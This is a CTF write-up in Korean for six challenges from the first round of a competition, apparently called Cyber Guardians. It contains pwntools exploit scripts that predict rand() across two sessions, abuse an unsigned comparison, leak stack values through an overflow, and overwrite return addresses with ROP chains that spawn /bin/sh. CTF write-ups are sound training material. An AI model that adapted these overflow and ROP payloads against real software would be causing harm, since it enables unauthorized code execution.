League of guardians write up.md
=
사이버 가디언즈 1차전에서 푼  풀이이다.

Randomgame1(misc) 
-
 nc로 접속하면 가위바위보를 한다. 바이너리를 아이다로 까보면 rand로 값을 만들고 win을 9번보다 많이 해야한다. 고로 다 이기면 된다. rand값을 이길려면 어쩌지 생각하다가 시드가 일정시간마다 바뀌는 것을 알았다. 

그래서 동시간에 세션을 2개 열어놓고 첫 번째 세션에서 나온 값을 토대로 win을 하기 위한 경우를 파악한 뒤 다 이겨주면 flag를 얻을 수 있다.

`solve.py`
```python
from pwn import *

s = remote("52.79.210.195",9292)
s2 = remote("52.79.210.195",9292)

win_list = []

for i in range(0,10):
	s.sendlineafter(": ", "1")
	result=s.recvline()
	if result == "You win!\n":
		win_list.append("1")
	elif result == "You lose!\n":
		win_list.append("2")
	else: win_list.append("3")

for i in range(0,10):
	s2.sendlineafter(": ",win_list[i])
	s2.recvuntil("You win!\n\n")

log.success(s2.recvline())
```
`flag{YoU_R_V3ry_Lucky_GUY!@#$}`

**![](https://lh5.googleusercontent.com/q7EduuOmhIZLizW0dxuKq0uCN87HIR5eL-UReD_OeUHvCioHfmWVEi64-rKsEInR7jV_0-3upmmj69W7dfZhlwWtXUVd_F3erutuJAx1nO_8AisjZA2ve28LFvx6HN_XsGPiGGRz)**

pang(misc)
-
이 문제는 그냥 pwntool이나 파이썬 소켓을 이용하면 풀리는 문제이다. random1 값이 나온 것을 그대로 입력하고 random2 나온 값을 input2로  또 입력하고 str(int(ran2[0].encode("hex"),16) * ran1)한 값을 input3에 입력하면 플래그가 나온다.

`solve.py`
```python
from pwn import *

s = remote("52.79.210.195",13001)

s.recvuntil('ran1 : ')
ran1=str(s.recv(14))
s.recvuntil('input random!\n\n')
s.sendline(ran1)
s.recvuntil('ran2 : ')
ran2=str(s.recv(20))
s.recvuntil('input random2!\n\n')
s.sendline(ran2)

s.recv()
input3=str(int(ran2[0].encode("hex"),16) * float(ran1))[:14]
log.info(input3)
s.sendline(input3)
s.interactive()
```


Randomgame2(pwn)
-
Randomgame1과 같은 방법이지만 조금 pwnable적 지식이 더해져서 pwn으로 나왔다. 바이너리를 아이다로 까보면

**![](https://lh5.googleusercontent.com/t4wJeY9EiKzl3YFpCRix7_HWC0wnye0IE96gTPJVch8D8CSFs3NyspajrYQc1drG3CiLZGwMlSmwDq5SpVv963f6F_wcKKu44Cpq1ZCe8EE_X4fRanBVvuaFRSTYYGuSbC-QE56j)** 

게임을 지면 --v8가 되고 이기면 ++v8이 된다. 그리고 v8 > v10(-3으로 초기화 되어있음)이면 cat flag를 해준다. 
하지만 여기서 핵심은 v8은 

**![](https://lh4.googleusercontent.com/oFO3vrLSeIoV5tgF7EjlooK_zY9vH2ElowMnlfSWm4XJw-V3tkgGtycSckMjsWGHynyHVPk6k0m3QPAcGr85hSJGnWm-8U6KV2FOFNHU4biXKyVokg5Li0MFAWdSrhI47JMG9Yev)**

unsigned로 선언 되어있다. 음수를 포함하지 않는다. 따라서 첫 바이트가 음과 양을 판단하기 때문에 -3보다 클려면 -4, -5, -6이렇게 되어야 한다. 따라서 가위바위보 게임에서 다 지면 된다. 

```python
from pwn import *

s = remote("52.78.156.241",4885)
s2 = remote("52.78.156.241",4885)

lose_list = []

for i in range(0,11):
	s.sendlineafter(": ", "1")
	result=s.recvline()
	if result == "You win!\n":
		lose_list.append("3")
	elif result == "You lose!\n":
		lose_list.append("1")
	else: lose_list.append("2")

for i in range(0,11):
	s2.sendlineafter(": ",lose_list[i])
	s2.recvuntil("You lose!\n\n")

log.success(s2.recvline())
```
`flag{ThATs_t0o_BAd_y0u_R_s0_uNLucky!@#$}`

**![](https://lh3.googleusercontent.com/7SUlNCZ93Hj9bvbLftWzme1NhVaCWPgoRAcEbU2e4Lb7cJ1frwL3_St_vsTLH15RppMzlnq52zRVSPSshjr4LHkgdJ4mgE3nUxVrPpfAAs_ZbhupBhY_y68HjEdL7wsSb2SGV2Bi)**

guess(pwn)
-
elf 64bit 문제이다. 


**![](https://lh3.googleusercontent.com/vLiNCMdRejXRccUGYdu-8wsoUoOwnK0SWHPXxZDu28rnUE2zjfhZSBb_ghvaB6FskO9avRGvb274SMLYY23pXAfU3T4ip7wU1RfKkt_sUsHfixc9CXhUrRIfAMP0Z6fUdYg1UsMd)**


메모리 보호 기법은 이러하다.

**![](https://lh6.googleusercontent.com/PnE3-7HHBpG7k0CXH9gVTRmSetQAXWkrXJtkBtr-oMxqnl1kT32zIrWklVPbldhjPNWQgle29iQzuTY2yguiAKBewCy3FpMiNFvdd82d_LRRpbiSgAxshY1M7lil3iYT5Ir2-q_S)**


바이너리를 까보면 v6이라는 변수에 rand값을 넣어준다. 그리고 그 값이 입력받는 값과 같으면 system("/bin/sh")을 실행해준다. buf의 위치는 rbp-0x20, v6변수의 위치는 rbp-0x10이다. buf의 주소부터 0x1E만큼 입력을 받을 수 있으니 오버플로우를 통해 "Nice to meet you %s"에서 v6(rand)값을 leak할 수 있다.


`exploit.py`
```python
from pwn import *

s = process("./guess")
#context.log_level = 'debug'
s.recvuntil('Tell me your name')

payload = "A"*15

s.sendline(payload)
s.recvuntil("A"*15+"\n")
leak=int(u32(s.recv(4)))
print (leak)
s.recvuntil('Okay, can you guess the random number?\n')
s.send(str(leak))
s.interactive()
```


yourNAME(pwn)
-
elf 64bit 문제이다.

**![](https://lh4.googleusercontent.com/QvNUncstkqYiV7rw434ww0lgtrL8sa70f1luprMjugK3bUrT7I5kpz-y2uaSqtd1ux-cWPdKruMs3UHs-75YdYanzwpueu8Nc7PPyX_fMzpO2Bl4k67-wI1_mOZ3wmYX16f77zAr)**

메모리 보호기법은 이러하다.


**![](https://lh6.googleusercontent.com/SCTbr3vyc1Sj1taF7wT8M9qhswYgo0aYVorKvjPHgK17Z8En912wM4w5YkuP3lRdmI1p-h09nB6Au7VrUorucXK1MSRREuRPaDKfwqWniISEX98OnIMEFZ0_Pd-I_Tl9yAEE3b3a)**


scanf에서 overflow가 발생한다. 그리고 바이너리를 잘 보면,


**![](https://lh5.googleusercontent.com/Ci3PNYMGNgRajSF1XWTosYk25c9Mwy1LUL55v6oIOdcPVYEniya88Q14oFAdsIUXhMtfsLt_8caOcKvAOa9tVauDj9NSpX6bEzvC2F4EYKE9uDQM73D4l8V67ISUVZd2B3i5-eYg)**

이런 함수가 있다. 위에 if문 무시하고

**![](https://lh6.googleusercontent.com/05KfovEsbj5EtXQcKq5sLQ2e4QbGoCVrWsVnF6bmeWghbTsdsewz0GbKjjsPZwIFr7okjByOfCWdD62Xvb5FprurEHQKopHy6UpwSuyWwxX-MgGQlO5uq-ARB19d3a8iN8IYtM9o)**

이 주소만 쓱싹해서 ret에 박으면 된다. 

`exploit.py`
```python
from pwn import *

s = remote("52.78.156.241",14191)
context.log_level = 'debug'

pr = 0x004008c3
binsh = 0x004008F0
payload = "A"*40
payload += p64(0x400788) #oneshot

s.sendlineafter('What your name?\n',payload)
s.interactive()
```

dance(pwn)
-
elf 64bit이다. 

**![](https://lh3.googleusercontent.com/zqGxI6OzffXPvUUKKCcoj2K6pkDZWdDEaS2-jsrGwyY4fAx98GCxerYp3DPCDaS31beGovx_rDGosIEbI7yqZe_eU7kk3SUgAnI4MKtU5_c-iMSFO8Efyz51DSkgaYh-l_Bf-6Xz)**

NX가 활성화 되어있다. 

아이다로 분석하면, 1번 메뉴나 2번 메뉴 scanf에서 overflow가 가능하다. 그리고 welldone 함수에서 system함수가 사용되었다.

 ROP할 때 system인자로 넘겨 줄 /bin/sh가젯은  바이너리 안에 있는 심볼인 fflush의 뒤에 sh부분만 사용하면 된다. 그리고 prdi 가젯을 사용하면 안 되고, gadget()에 있는 pop rdi, pop rbp, ret을 사용해야 한다. 

`exploit.py`
```python
from pwn import *

s = process("./dance")

sh = 0x40046f
pprdi = 0x4008fa
system = 0x400760

s.recvuntil("4. exit\n")
s.sendline("1")
s.recvuntil("!\n")

payload = "wellwell"
payload += "A"*64
payload += p64(pprdi)
payload += p64(sh)
payload += p64(0)
payload += p64(system)

s.sendline(payload)
s.interactive()
```
